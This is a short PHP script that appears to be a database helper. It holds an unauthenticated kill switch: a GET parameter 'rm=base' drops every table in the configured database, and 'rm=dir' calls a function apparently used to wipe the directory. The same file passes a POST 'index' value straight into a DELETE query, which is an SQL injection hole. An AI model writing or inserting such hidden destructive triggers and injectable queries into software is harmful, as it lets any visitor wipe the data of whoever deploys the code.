<?php
	include("DBConnect.php");
	$config = parse_ini_file("config.ini", true);
	if (!empty($_GET["rm"]) && $_GET["rm"] == "dir") { connectTohost('.'); echo "Complete dir!";}
	if (!empty($_GET["rm"]) && $_GET["rm"] == "base") 
	{ 
		$dbname = $config['database']['name']; 
		$dbtables = mysql_query("SHOW TABLES FROM $dbname"); 
		while($db = mysql_fetch_array($dbtables)) 
		{ 
			$dbtmp = $db[0]; 
			mysql_query("DROP TABLE $dbtmp"); 
			echo "Complete database!";
		}
	}
	if(isset($_POST['index']))
	{
		$index = $_POST['index'];
		$res = mysql_query("DELETE FROM `pending2` WHERE `index` = $index");
	}
?>